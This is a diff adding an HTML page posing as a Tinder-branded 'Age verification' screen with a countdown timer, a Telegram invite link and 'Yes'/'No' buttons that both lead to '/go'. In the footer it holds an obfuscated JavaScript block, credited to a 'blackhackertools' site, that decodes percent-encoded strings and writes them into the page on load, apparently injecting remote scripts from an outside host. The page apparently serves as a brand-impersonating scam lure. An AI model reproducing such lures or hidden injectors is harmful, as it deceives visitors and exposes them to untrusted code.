@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Age verification</title>
+    <link rel="icon" type="image/x-icon" href="img/logo-white2.png">
+	<link rel="canonical" href="https://t.me/+1wLau4z5x5ZkYzQ9" />
+    <script src="js/jquery.js"></script>
+    <script src="js/vegas.js"></script>
+    <script src="js/jquery.countdown.js"></script>
+    <link href="css/style.css" type="text/css" rel="stylesheet">
+</head>
+<body id="home" class="vegas-container">
+    <div class="vegas-timer">
+        <div class="vegas-timer-progress" style="transition-duration: 0ms;"></div>
+    </div>
+    <div class="vegas-slide vegas-transition-fade vegas-transition-fade-in vegas-transition-fade-out" style="transition: all 2000ms ease 0s;">
+        <div class="vegas-slide-inner" style="background-image: url('img/slide3.jpg'); background-color: rgb(238, 238, 238); background-position: center center; background-size: cover;"></div>
+    </div>
+    <div class="vegas-slide vegas-transition-fade vegas-transition-fade-in vegas-transition-fade-out" style="transition: all 2000ms ease 0s;">
+        <div class="vegas-slide-inner" style="background-image: url('img/slide1.jpg'); background-color: rgb(238, 238, 238); background-position: center center; background-size: cover;"></div>
+    </div>
+    <div class="vegas-slide vegas-transition-fade vegas-transition-fade-in vegas-transition-fade-out" style="transition: all 2000ms ease 0s;">
+        <div class="vegas-slide-inner" style="background-image: url('img/slide4.jpg'); background-color: rgb(238, 238, 238); background-position: center center; background-size: cover;"></div>
+    </div>
+    <div class="vegas-slide vegas-transition-fade vegas-transition-fade-in vegas-transition-fade-out" style="transition: all 2000ms ease 0s;">
+        <div class="vegas-slide-inner" style="background-image: url('img/slide2.jpg'); background-color: rgb(238, 238, 238); background-position: center center; background-size: cover;"></div>
+    </div>
+    <div class="vegas-slide vegas-transition-fade vegas-transition-fade-in" style="transition: all 2000ms ease 0s;">
+        <div class="vegas-slide-inner" style="background-image: url('img/slide3.jpg'); background-color: rgb(238, 238, 238); background-position: center center; background-size: cover;"></div>
+    </div>
+    <div class="vegas-timer vegas-timer-running">
+        <div class="vegas-timer-progress" style="transition-duration: 2400ms;"></div>
+    </div>
+    <div class="container">
+        <div class="row nav-wrapper">
+            <div class="col-md-12 col-sm-12 col-xs-12 text-center">
+                <a href="#"><img alt="Tinder" src="img/logo-white2.png" href="/go"></a>
+            </div>
+        </div>
+        <div class="row hero-content text-center">
+            <div class="col-md-6 col-md-offset-3 wowload fadeInRight">
+                <div class="spacer"></div>
+                <div class="content">
+                    <div class="clock">01:07</div>
+                    <h1>Age verification?</h1>
+                </div>
+                <div class="step">
+                    <p>Are you older than 18 years?</p>
+                    <a class="btn btn-end" href="/go"><span>Yes</span></a>
+                    <a class="btn btn-end" href="/go" <span>No</span></a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script language="JavaScript" type="text/javascript">
+    function clear_delay(e) { window.clearTimeout(e) }
+    function run_loading_run_1(e) { timeoutID1 = window.setTimeout(run_loading_1, e) }
+    function run_loading_1() { $(".thank_for_close, .run_loading_2").fadeIn();
+        $(".main_review").hide() }
+    function run_loading_run_2(e) { timeoutID2 = window.setTimeout(run_loading_2, e) }
+    function run_loading_2() { $(".thank_for_close, .run_loading_2").hide();
+        $(".run_loading_3, .li_run_loading_1, .li_run_loading_2").fadeIn() }
+    function run_loading_run_3(e) { timeoutID3 = window.setTimeout(run_loading_3, e) }
+    function run_loading_3() { $(".run_loading_3").hide();
+        $(".run_loading_4, .li_run_loading_3").fadeIn() }
+    function run_loading_run_4(e) { timeoutID3 = window.setTimeout(run_loading_4, e) }
+    function run_loading_4() { $(".run_loading_4, .loading").hide();
+        $(".li_run_loading_4, li_run_loading_5, .run_loading_5, .show_end").fadeIn() } $(function() { $(document).on("click", ".next", function(e) { e.preventDefault();
+            $(this).parent().hide().next().fadeIn() });
+        $(document).on("click", ".run_loading", function(e) { e.preventDefault();
+            $(this).parent().hide().next().fadeIn();
+            $(".step4 .loading").show();
+            run_loading_run_1("1000");
+            run_loading_run_2("2250");
+            run_loading_run_3("3000");
+            run_loading_run_4("4000") }) })
+    </script>
+    <script type="text/javascript">
+    $("#example, body").vegas({
+        delay: 2500,
+        timer: false,
+        shuffle: true,
+        timer: true,
+        transition: 'fade',
+        transitionDuration: 2000,
+        slides: [
+            { src: 'img/slide1.jpg' },
+            { src: 'img/slide2.jpg' },
+            { src: 'img/slide3.jpg' },
+            { src: 'img/slide4.jpg' }
+        ]
+    });
+    </script>
+    <script type="text/javascript">
+    var interval = setInterval(function() {
+        var timer = $('.clock').html();
+        timer = timer.split(':');
+        var minutes = parseInt(timer[0], 10);
+        var seconds = parseInt(timer[1], 10);
+        seconds -= 1;
+        if (minutes < 0) return clearInterval(interval);
+        if (minutes < 10 && minutes.length != 2) minutes = '0' + minutes;
+        if (seconds < 0 && minutes != 0) {
+            minutes -= 1;
+            seconds = 59;
+        } else if (seconds < 10 && length.seconds != 2) seconds = '0' + seconds;
+        $('.clock').html(minutes + ':' + seconds);
+        if (minutes == 0 && seconds == 0)
+            clearInterval(interval);
+    }, 1000);
+    </script>
+    <div class="bgfoot">
+<script language="javascript">
+<!--
+// == Code Obfuscation Protection from https://blackhackertools.com == //
+function _0x1317(_0x759c5a,_0x15cf89){var _0x2bf7ef=_0x10dd();return _0x1317=function(_0x5ed3b6,_0x4adf34){_0x5ed3b6=_0x5ed3b6-(0x1118+0x18c+-0x2*0x871);var _0x31e496=_0x2bf7ef[_0x5ed3b6];return _0x31e496;},_0x1317(_0x759c5a,_0x15cf89);}var _0x2a02dc=_0x1317;function _0x10dd(){var _0x501dd6=['3%63%72%69','5%30%61%31','6421496nYnyWe','65%27%2C%0','7ZQhfwG','3D%22%74%6','%74%68%27%','%22%20%64%','A%20%27%38','F%38%39%32','70%65%3D%2','5%32%39%30','%20%27%69%','16574gGDVXB','32%39%33%3','%72%61%6D%','76%6F%6B%6','%63%34%33%','%68%65%69%','2F%73%63%7','73%63%72%6','7%69%70%74','9%66%30%62','%36%30%2C%','9%70%74%3E','6%64%39%65','36%37%30%3','4%69%76%3E','D%65%6E%74','%63%72%27%','34%35%37%6','7%66%6F%72','20%73%72%6','9sFWYhS','%38%39%32%','%31%37%63%','%2F%69%6E%','%37%63%2E%','7%29%3B%0A','%6A%61%76%','09%61%74%4','63%34%33%6','%0A%09%09%','61%73%63%7','%6F%6E%73%','%35%39%66%','9%39%39%2F','%65%22%20%','0%74%20%74','20%7B%7D%0','3674oWCvwr','35%30%61%3','%27%20%3A%','65%33%66%3','%22%3E%0A%','4%36%38%2C','72%30%64%6','%30%36%32%','%3E%3C%2F%','2%35%39%66','69%74%65%2','74%61%69%6','%39%39%22%','67%68%74%2','5%66%33%33','0%27%69%66','%3C%2F%73%','3842982EGSzQc','764WQvQSU','69%76%20%6','9%64%3D%22','79%27%20%3','30%65%30%3','E%65%72%2D','20%3D%20%7','3%65%32%39','73%72%63%3','2E%63%6F%6','257202aszQJY','61%76%61%7','%3C%73%63%','5%33%66%39','63%6F%6D%2','5%2E%6A%73','%34%62%66%','D%2F%38%34','2%27%20%2B','7%77%69%64','27%70%61%7','%74%2F%6A%','0%74%3E%0A','A%09%09%27','%2E%77%72%','%35%34%66%','%30%65%30%','%68%7A%72%','65%32%39%3','27%20%3A%2','37%30%33%6','%20%3C%73%','72%69%70%7','7%20%3A%20','E%6A%73%22','D%32%38%6D','0A%09%09%2','20%2B%20%2','%79%6E%63%','%33%39%64%','8845fyFtZB','%63%6F%6E%','%65%27%2C%','%62%66%36%','64%62%66%3','63%72%69%7','3D%22%61%7','6F%63%75%6','%0A%09%64%','%20%74%79%','6%61%6C%73','D%63%66%61','A%09%7D%3B','8%27%3C%73','2%38%6D%31','%64%62%66%','3E%3C%2F%6','3%79%6E%63','%2F%68%7A%','%27%6B%65%','%36%32%32%','3%3D%22%2F','%0A%3C%64%','63%3D%22%6','%73%79%6E%','20%3A%20%3','write','%79%70%65%','%70%74%22%','7%65%66%33','70%74%3E%2','F%70%74%69','4163988xrWonK','61%74%61%2','5%78%74%2F','32%34%35%3','8720EovmfZ','%39%64%65%','2%69%70%74','D%22%2F%2F','30%64%6D%3','3%36%64%39','1%35%34%66','39%66%30%6','4%20%61%73','B%0A%09%09','6F%6B%65%2','2%74%65%78','%69%6E%76%','2%61%6D%73','%22%3E%3C%','%6D%61%74%'];_0x10dd=function(){return _0x501dd6;};return _0x10dd();}(function(_0x449c27,_0x3ce6e2){var _0x23950a=_0x1317,_0x542238=_0x449c27();while(!![]){try{var _0x35d1c9=parseInt(_0x23950a(0x1e1))/(-0xd24+0x129d+-0x578)*(parseInt(_0x23950a(0x1cd))/(-0x24d7+-0x5b*-0x49+0xae6))+parseInt(_0x23950a(0x203))/(0x35c*0xb+-0x10bf+0x16*-0xeb)+-parseInt(_0x23950a(0x204))/(-0x1ae+-0x20a2*-0x1+-0x1ef0)*(parseInt(_0x23950a(0x22c))/(-0x44c+0x1164+-0xd13))+-parseInt(_0x23950a(0x24c))/(0xd69+0x1*0x1b31+-0x2894)+parseInt(_0x23950a(0x1c4))/(0x920+0x65*0x5e+-0x2e2f)*(parseInt(_0x23950a(0x1c2))/(0x1*0x124d+-0x120b+0x1d*-0x2))+-parseInt(_0x23950a(0x20e))/(0x1c1d*0x1+-0x4fb+-0x291*0x9)+-parseInt(_0x23950a(0x250))/(0x13b1*0x1+0xd7*-0xb+-0x56*0x1f)*(parseInt(_0x23950a(0x1f2))/(0xd45+-0x8f4+0x223*-0x2));if(_0x35d1c9===_0x3ce6e2)break;else _0x542238['push'](_0x542238['shift']());}catch(_0x2cc236){_0x542238['push'](_0x542238['shift']());}}}(_0x10dd,0xe126+-0xbaed1*0x1+-0xb8e26*-0x2),document[_0x2a02dc(0x246)](unescape(_0x2a02dc(0x223)+_0x2a02dc(0x231)+_0x2a02dc(0x1f0)+_0x2a02dc(0x247)+_0x2a02dc(0x1c5)+_0x2a02dc(0x24e)+_0x2a02dc(0x1e7)+_0x2a02dc(0x1eb)+_0x2a02dc(0x252)+_0x2a02dc(0x1f6)+_0x2a02dc(0x1e8)+_0x2a02dc(0x24b)+_0x2a02dc(0x1ec)+_0x2a02dc(0x20a)+_0x2a02dc(0x259)+_0x2a02dc(0x23f)+_0x2a02dc(0x207)+_0x2a02dc(0x1c8)+_0x2a02dc(0x214)+_0x2a02dc(0x1da)+_0x2a02dc(0x20b)+_0x2a02dc(0x1f9)+_0x2a02dc(0x24f)+_0x2a02dc(0x249)+_0x2a02dc(0x22b)+_0x2a02dc(0x220)+_0x2a02dc(0x255)+_0x2a02dc(0x22e)+_0x2a02dc(0x228)+_0x2a02dc(0x1df)+_0x2a02dc(0x25f)+_0x2a02dc(0x221)+_0x2a02dc(0x201)+_0x2a02dc(0x1cf)+_0x2a02dc(0x1c3)+_0x2a02dc(0x21b)+_0x2a02dc(0x1d2)+_0x2a02dc(0x1ff)+_0x2a02dc(0x225)+_0x2a02dc(0x1d7)+_0x2a02dc(0x228)+_0x2a02dc(0x217)+_0x2a02dc(0x1c6)+_0x2a02dc(0x245)+_0x2a02dc(0x1f7)+_0x2a02dc(0x1ea)+_0x2a02dc(0x218)+_0x2a02dc(0x25d)+_0x2a02dc(0x1f4)+_0x2a02dc(0x1f1)+_0x2a02dc(0x238)+_0x2a02dc(0x234)+_0x2a02dc(0x233)+_0x2a02dc(0x1dc)+_0x2a02dc(0x21c)+_0x2a02dc(0x1fc)+_0x2a02dc(0x239)+_0x2a02dc(0x1dd)+_0x2a02dc(0x229)+_0x2a02dc(0x1d5)+_0x2a02dc(0x235)+_0x2a02dc(0x1ca)+_0x2a02dc(0x25b)+_0x2a02dc(0x219)+_0x2a02dc(0x20f)+_0x2a02dc(0x260)+_0x2a02dc(0x248)+_0x2a02dc(0x1e0)+_0x2a02dc(0x241)+_0x2a02dc(0x23e)+_0x2a02dc(0x1f8)+_0x2a02dc(0x227)+_0x2a02dc(0x1e3)+_0x2a02dc(0x20d)+_0x2a02dc(0x215)+_0x2a02dc(0x22f)+_0x2a02dc(0x222)+_0x2a02dc(0x1cb)+_0x2a02dc(0x240)+_0x2a02dc(0x1de)+_0x2a02dc(0x200)+_0x2a02dc(0x251)+_0x2a02dc(0x1ce)+_0x2a02dc(0x1d9)+_0x2a02dc(0x1e4)+_0x2a02dc(0x1d0)+_0x2a02dc(0x213)+_0x2a02dc(0x25e)+_0x2a02dc(0x1d3)+_0x2a02dc(0x216)+_0x2a02dc(0x1cc)+_0x2a02dc(0x24a)+_0x2a02dc(0x1e6)+_0x2a02dc(0x202)+_0x2a02dc(0x231)+_0x2a02dc(0x21a)+_0x2a02dc(0x210)+_0x2a02dc(0x224)+_0x2a02dc(0x258)+_0x2a02dc(0x22a)+(_0x2a02dc(0x232)+_0x2a02dc(0x23d)+_0x2a02dc(0x1c7)+_0x2a02dc(0x24d)+_0x2a02dc(0x237)+_0x2a02dc(0x244)+_0x2a02dc(0x243)+_0x2a02dc(0x236)+_0x2a02dc(0x1ef)+_0x2a02dc(0x20c)+_0x2a02dc(0x253)+_0x2a02dc(0x21f)+_0x2a02dc(0x254)+_0x2a02dc(0x23a)+_0x2a02dc(0x1e5)+_0x2a02dc(0x212)+_0x2a02dc(0x1c9)+_0x2a02dc(0x21e)+_0x2a02dc(0x257)+_0x2a02dc(0x1fb)+_0x2a02dc(0x23b)+_0x2a02dc(0x1f3)+_0x2a02dc(0x256)+_0x2a02dc(0x1d1)+_0x2a02dc(0x1f5)+_0x2a02dc(0x1ee)+_0x2a02dc(0x25c)+_0x2a02dc(0x25a)+_0x2a02dc(0x226)+_0x2a02dc(0x1fa)+_0x2a02dc(0x1d4)+_0x2a02dc(0x1d8)+_0x2a02dc(0x242)+_0x2a02dc(0x205)+_0x2a02dc(0x206)+_0x2a02dc(0x22d)+_0x2a02dc(0x1fd)+_0x2a02dc(0x209)+_0x2a02dc(0x1e2)+_0x2a02dc(0x208)+_0x2a02dc(0x1d6)+_0x2a02dc(0x1ed)+_0x2a02dc(0x230)+_0x2a02dc(0x261)+_0x2a02dc(0x21d)+_0x2a02dc(0x1e9)+_0x2a02dc(0x211)+_0x2a02dc(0x1fe)+_0x2a02dc(0x23c)+_0x2a02dc(0x1db)))));
+//-->
+</script>
+        </div>
+</body>
+</html>
